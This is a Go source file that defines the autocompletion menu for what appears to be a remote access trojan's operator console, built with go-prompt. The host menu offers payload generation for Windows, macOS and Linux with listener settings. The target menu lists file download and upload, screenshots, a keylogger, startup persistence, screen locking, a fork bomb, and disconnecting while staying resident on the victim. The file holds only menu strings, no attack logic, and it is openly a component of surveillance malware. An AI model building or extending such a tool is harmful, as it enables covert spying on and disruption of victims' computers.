package completer

import prompt "github.com/c-bata/go-prompt"

func HostCompleter(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "generate", Description: "Generate a payload"},
		{Text: "lhost=", Description: "Specify a ip for connection"},
		{Text: "lport=", Description: "Specify a port for connection"},
		{Text: "fname=", Description: "Specify a filename to output"},
		{Text: "--windows", Description: "Target Windows"},
		{Text: "--macos", Description: "Target Mac OS"},
		{Text: "--linux", Description: "Target Linux"},
		{Text: "listen", Description: "Listen for a new connection"},
		{Text: "serve", Description: "Serve files"},
		{Text: "exit", Description: "Quit this program"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func TargetCompleter(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "download", Description: "File Download"},
		{Text: "upload", Description: "File Upload"},
		{Text: "screenshot", Description: "Take a Screenshot"},
		{Text: "keylogger_start", Description: "Start Keylogger session"},
		{Text: "keylogger_show", Description: "Show Keylogger session logs"},
		{Text: "persistence_enable", Description: "Install at Startup"},
		{Text: "persistence_disable", Description: "Remove from Startup"},
		{Text: "getos", Description: "Get OS name"},
		{Text: "lockscreen", Description: "Lock the OS screen"},
		{Text: "openurl", Description: "Open the URL informed"},
		{Text: "bomb", Description: "Run Fork Bomb"},
		{Text: "clear", Description: "Clear the Screen"},
		{Text: "back", Description: "Close connection but keep running on target"},
		{Text: "exit", Description: "Close connection and exit on target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
